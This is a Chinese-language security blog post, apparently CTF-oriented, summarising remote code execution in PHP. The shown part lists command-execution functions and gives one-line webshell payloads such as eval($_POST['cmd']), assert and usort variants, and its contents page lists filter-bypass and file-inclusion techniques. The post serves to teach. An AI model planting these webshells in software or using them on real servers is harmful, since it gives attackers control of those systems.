<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" RCE 什么是RCE漏洞？即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。\n在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时（当应用程序未正确验证、过滤或限制用户输入时），就产生了RCE漏洞。\n">
<title>RCE与文件包含总结</title>

<link rel='canonical' href='https://luo-kaihong.github.io/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/'>

<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="RCE与文件包含总结">
<meta property='og:description' content=" RCE 什么是RCE漏洞？即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。\n在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时（当应用程序未正确验证、过滤或限制用户输入时），就产生了RCE漏洞。\n">
<meta property='og:url' content='https://luo-kaihong.github.io/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/'>
<meta property='og:site_name' content='罗铠鸿'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-11-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-19T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="RCE与文件包含总结">
<meta name="twitter:description" content=" RCE 什么是RCE漏洞？即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。\n在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时（当应用程序未正确验证、过滤或限制用户输入时），就产生了RCE漏洞。\n">
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">💗</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
                        target="_blank"
                        title="csdn"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>关于</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>归档</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>搜索</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>友情链接</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>暗色模式</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#一命令执行漏洞">一.<strong>命令执行漏洞</strong>：</a></li>
    <li><a href="#二代码执行漏洞"><strong>二.代码执行漏洞</strong>：</a></li>
    <li><a href="#三php执行系统命令函数绕过bypass姿势"><strong>三.php执行系统命令函数</strong>绕过bypass姿势</a>
      <ol>
        <li><a href="#31空格绕过">3.1空格绕过</a>
          <ol>
            <li><a href="#ifs代替空格">$IFS代替空格</a></li>
            <li><a href="#大括号">大括号{}：</a></li>
            <li><a href="#重定向字符">重定向字符&lt;，&lt;&gt;</a></li>
            <li><a href="#0920绕过">%09,%20绕过</a></li>
          </ol>
        </li>
        <li><a href="#32关键词过滤绕过">3.2关键词过滤绕过</a>
          <ol>
            <li><a href="#绕过文件名过滤通配符绕过">??,*绕过文件名过滤（通配符绕过）</a></li>
            <li><a href="#单引号双引号反引号绕过正则">单引号(&rsquo;)双引号(&quot;&quot;)反引号(``)绕过正则</a></li>
            <li><a href="#反斜杠绕过">反斜杠绕过</a></li>
            <li><a href="#1到9和绕过">$1到$9、$@和$*绕过</a></li>
            <li><a href="#变量拼接绕过内联执行">变量拼接绕过（内联执行）</a></li>
            <li><a href="#利用base6432编码绕过">利用base64(32)编码绕过</a></li>
            <li><a href="#利用hex编码绕过">利用hex编码绕过</a></li>
            <li><a href="#利用linux中的环境变量">利用linux中的环境变量</a></li>
          </ol>
        </li>
        <li><a href="#33系统读取命令被过滤">3.3系统读取命令被过滤</a></li>
        <li><a href="#34命令执行中无字母rce">3.4:命令执行中无字母rce</a></li>
      </ol>
    </li>
    <li><a href="#四php文件操作">四：php文件操作</a>
      <ol>
        <li><a href="#41查看目录">4.1查看目录</a></li>
        <li><a href="#42文件读取">4.2文件读取：</a></li>
      </ol>
    </li>
    <li><a href="#五eval中无参数文件读取">五：eval中无参数文件读取</a>
      <ol>
        <li><a href="#51文件读取之查看当前目录">5.1文件读取之查看当前目录</a>
          <ol>
            <li><a href="#1利用getcwd">1.利用getcwd</a></li>
            <li><a href="#2如果getcwd被禁用了咋搞用localeconv">2.如果getcwd被禁用了咋搞，用<code>localeconv()</code></a></li>
            <li><a href="#3如果localeconv禁用怎么办就用chr">3.如果localeconv禁用怎么办，就用<strong>chr</strong></a></li>
            <li><a href="#4phpversion函数">4.phpversion()函数</a></li>
            <li><a href="#5crypt">5.<strong>crypt()</strong></a></li>
          </ol>
        </li>
        <li><a href="#52读取当前目录文件">5.2读取当前目录文件</a>
          <ol>
            <li><a href="#用array_randarray_flip爆破">用array_rand+array_flip爆破</a></li>
            <li><a href="#用nextarray_reverse">用next+array_reverse</a></li>
          </ol>
        </li>
        <li><a href="#53查看上级目录">5.3查看上级目录</a>
          <ol>
            <li><a href="#dirname方法">dirname()方法</a></li>
            <li><a href="#构造">构造<code>&#34;..&#34;</code></a></li>
            <li><a href="#crypt">crypt()</a></li>
          </ol>
        </li>
        <li><a href="#54读取上级目录">5.4读取上级目录</a></li>
        <li><a href="#55查看读取根目录文件">5.5查看读取根目录文件</a>
          <ol>
            <li><a href="#cryptserializearray_rand与array_flip">crypt()+serialize+array_rand与array_flip</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#六eval种无参数rce">六：eval种无参数rce</a>
      <ol>
        <li><a href="#1获取环境变量">1.获取环境变量</a></li>
        <li><a href="#2利用getallheaders">2.利用getallheaders()</a></li>
        <li><a href="#3get_defined_vars">3.get_defined_vars()</a></li>
        <li><a href="#4session_id">4.session_id()</a></li>
      </ol>
    </li>
    <li><a href="#七eval中无数字字母rce">七:eval中无数字字母rce</a>
      <ol>
        <li><a href="#取反">取反</a></li>
        <li><a href="#自增">自增</a></li>
        <li><a href="#异或">异或</a></li>
        <li><a href="#或运算">或运算</a></li>
      </ol>
    </li>
    <li><a href="#八eval中无数字字母rce扩展">八.eval中无数字字母RCE(扩展)</a></li>
    <li><a href="#九长度限制rce">九:长度限制RCE</a></li>
  </ol>

  <ol>
    <li><a href="#一无限制本地文件包含">一.无限制本地文件包含</a>
      <ol>
        <li><a href="#利用伪协议打本地文件包含">利用伪协议打本地文件包含</a></li>
        <li><a href="#1data伪协议"><strong>1.data伪协议</strong></a></li>
        <li><a href="#2filter协议文件包含">2.filter协议文件包含</a>
          <ol>
            <li><a href="#convert转换过滤器">convert转换过滤器</a></li>
            <li><a href="#string字符串过滤器">string字符串过滤器</a></li>
            <li><a href="#加密过滤器">加密过滤器</a></li>
          </ol>
        </li>
        <li><a href="#3input协议文件包含">3.input协议文件包含</a></li>
        <li><a href="#4file协议文件包含">4.file协议文件包含</a></li>
        <li><a href="#5phar伪协议">5.phar://伪协议</a></li>
        <li><a href="#6zip-伪协议zlibbzip2">6.zip:// 伪协议（zlib://，bzip2://）</a></li>
        <li><a href="#7expect伪协议">7.expect://伪协议</a></li>
        <li><a href="#8目录穿越">8.目录穿越</a></li>
      </ol>
    </li>
    <li><a href="#二有限制本地文件包含漏洞">二：有限制本地文件包含漏洞</a>
      <ol>
        <li>
          <ol>
            <li><a href="#2100截断文件包含">2.1%00截断文件包含</a></li>
            <li><a href="#22路径长度截断文件包含">2.2.路径长度截断文件包含</a></li>
            <li><a href="#23点号截断文件包含">2.3.点号截断文件包含</a></li>
            <li><a href="#24require_once-绕过不能重复包含文件的限制">2.4.require_once 绕过不能重复包含文件的限制</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#三日志包含">三.日志包含</a>
      <ol>
        <li><a href="#31中间件日志文件包含">3.1中间件日志文件包含</a></li>
        <li><a href="#32ssh日志文件包含">3.2.SSH日志文件包含</a></li>
      </ol>
    </li>
    <li><a href="#四session包含">四.session包含</a>
      <ol>
        <li><a href="#41session的工作原理">4.1Session的工作原理</a></li>
        <li><a href="#42利用条件">4.2利用条件</a></li>
        <li><a href="#43如何创建session文件呢">4.3如何创建session文件呢。</a></li>
        <li><a href="#44攻击步骤">4.4.攻击步骤</a></li>
      </ol>
    </li>
    <li><a href="#五无限制远程文件包含">五:无限制远程文件包含</a></li>
    <li><a href="#六有限制远程文件包含">六:有限制远程文件包含</a>
      <ol>
        <li><a href="#61通过问号绕过">6.1通过问号绕过</a></li>
        <li><a href="#62通过号绕过">6.2通过#号绕过</a></li>
        <li><a href="#63通过空格绕过">6.3通过空格绕过</a></li>
      </ol>
    </li>
    <li><a href="#七利用pearcmdphp从lfi到getshell">七:利用pearcmd.php从LFI到getshell</a></li>
    <li><a href="#八利用filter过滤器的编码组合构造rce">八：利用filter过滤器的编码组合构造RCE</a></li>
    <li><a href="#九include解析phar文件执行命令">九:include解析phar文件执行命令</a></li>
    <li><a href="#十php伪协议与死亡绕过">十:php伪协议与死亡绕过</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/web/" style="background-color: #ff0000; color: #fff;">
                web
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/">RCE与文件包含总结</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-11-19</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    阅读时长: 42 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <hr>
<h1 id="rce">RCE
</h1><p>什么是RCE漏洞？即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。</p>
<p>在很多Web应用中，<strong>开发人员</strong>会使用一些<strong>特殊函数</strong>，这些函数以一些字符串作为输入，功能是将输入的字符串当作<strong>代码</strong>或者<strong>命令</strong>来进行执行。当<strong>用户</strong>可以控制这些函数的输入时（当应用程序未正确<strong>验证</strong>、<strong>过滤</strong>或<strong>限制</strong>用户输入时），就产生了RCE漏洞。</p>
<h2 id="一命令执行漏洞">一.<strong>命令执行漏洞</strong>：
</h2><p>直接调用<strong>操作系统命令</strong>。例如，当Web应用在调用一些能将字符串转化成代码的函数时，如果未对用户输入进行合适的处理，可能造成命令执行漏洞。<strong>php执行系统命令函数如下</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">system</span> <span class="o">:</span> <span class="nx">执行外部程序，并且显示输出，如果</span> <span class="nx">PHP</span> <span class="nx">运行在服务器模块中，</span> <span class="nx">system</span><span class="p">()</span> <span class="nx">函数还会尝试在每行输出完毕之后，</span> <span class="nx">自动刷新</span> <span class="nx">web</span> <span class="nx">服务器的输出缓存。如果要获取一个命令未经任何处理的</span> <span class="nx">原始输出，</span> <span class="nx">请使用</span> <span class="nx">passthru</span><span class="p">()</span> <span class="nx">函数。</span>
</span></span><span class="line"><span class="cl"><span class="nx">exec</span> <span class="nx">：</span> <span class="nx">执行一个外部程序</span><span class="p">,</span><span class="nx">回显最后一行</span><span class="p">,</span><span class="nx">需要用echo输出。</span>
</span></span><span class="line"><span class="cl"><span class="nx">shell_exec</span> <span class="nx">：</span> <span class="nx">通过</span> <span class="nx">shell</span> <span class="nx">环境执行命令，并且将完整的输出以字符串的方式返回。</span>
</span></span><span class="line"><span class="cl"><span class="nx">popen</span> <span class="nx">：</span> <span class="nx">打开一个指向进程的管道，该进程由派生给定的</span> <span class="nx">command</span> <span class="nx">命令执行而产生。</span>
</span></span><span class="line"><span class="cl"><span class="nx">proc_open</span> <span class="nx">：</span> <span class="nx">执行一个命令，并且打开用来输入</span><span class="o">/</span><span class="nx">输出的文件指针。</span>
</span></span><span class="line"><span class="cl"><span class="nx">passthru</span> <span class="nx">：</span> <span class="nx">执行外部程序并且显示原始输出。同</span> <span class="nx">exec</span><span class="p">()</span> <span class="nx">函数类似，</span> <span class="nx">passthru</span><span class="p">()</span> <span class="nx">函数</span> <span class="nx">也是用来执行外部命令（command）的。</span> <span class="nx">当所执行的</span> <span class="nx">Unix</span> <span class="nx">命令输出二进制数据，</span> <span class="nx">并且需要直接传送到浏览器的时候，</span> <span class="nx">需要用此函数来替代</span> <span class="nx">exec</span><span class="p">()</span> <span class="nx">或</span> <span class="nx">system</span><span class="p">()</span> <span class="nx">函数。</span> <span class="nx">常用来执行诸如</span> <span class="nx">pbmplus</span> <span class="nx">之类的可以直接输出图像流的命令。</span> <span class="nx">通过设置</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">type</span> <span class="nx">为</span> <span class="nx">image</span><span class="o">/</span><span class="nx">gif，</span> <span class="nx">然后调用</span> <span class="nx">pbmplus</span> <span class="nx">程序输出</span> <span class="nx">gif</span> <span class="nx">文件，</span> <span class="nx">就可以从</span> <span class="nx">PHP</span> <span class="nx">脚本中直接输出图像到浏览器。</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nx">pcntl_exec</span><span class="p">()</span> <span class="nx">：</span> <span class="nx">在当前进程空间执行指定程序，当发生错误时返回</span> <span class="k">false</span> <span class="nx">，没有错误时没有返回。</span>
</span></span><span class="line"><span class="cl"><span class="err">`</span><span class="nx">（反引号）：同</span> <span class="nx">shell_exec</span><span class="p">()</span><span class="nx">。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="二代码执行漏洞"><strong>二.代码执行漏洞</strong>：
</h2><p>靠执行脚本代码调用操作系统命令。例如，PHP中的system()、exec()和passthru()函数，如果未对用户输入进行过滤或过滤不严，可能导致代码执行漏洞。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">eval</span><span class="p">()</span>	<span class="nx">：</span><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">assert()：&lt;?php @assert($_POST[&#39;cmd&#39;])?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">call_user_func()：&lt;?php call_user_func(&#34;assert&#34;,$_POST[&#39;cmd&#39;]); ?&gt;	#第一个参数作为为命令函数，第二个参数被第一个参数所调用
</span></span></span><span class="line"><span class="cl"><span class="err">create_function()：&lt;?php $func =create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);$func(); ?&gt;#意思创造匿名函数，执行$_POST[&#39;cmd&#39;]，当调用这个匿名函数时就执行了命令,php版本要求&lt; 7.2.0
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">array_map()：&lt;?php array_map(&#34;system&#34;, array(&#34;dir&#34;));?&gt;#第二个参数要是数组
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">call_user_func_array()：&lt;?php call_user_func_array(&#34;system&#34;, array(&#34;dir&#34;));?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">array_filter()	#&lt;?php array_filter(array(&#34;dir&#34;),&#34;system&#34;);?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">uasort()：&lt;?php usort($_GET,&#39;asse&#39;.&#39;rt&#39;);?&gt;#然后get传参1=1+1&amp;2=eval($_POST[cmd])就行，解释一下usort 会多次调用 assert 函数来比较数组元素，每次调用assert(&#34;1+1&#34;) 和 assert(&#34;eval($_POST[cmd])&#34;)，
</span></span></span><span class="line"><span class="cl"><span class="err">php环境5.0-5.6可用-与assert()的变更有关
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">preg_replace()：&lt;?php preg_replace(&#34;/test/e&#34;,system(&#39;dir&#39;),&#34;jutst test&#34;);?&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="三php执行系统命令函数绕过bypass姿势"><strong>三.php执行系统命令函数</strong>绕过bypass姿势
</h2><p>一般考这种系统命令执行都是给个system，然后让你给$a传参，执行命令，假设flag在根，我们可以执行<code>ls /</code>查看根，然后<code>cat /flag</code>那下flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
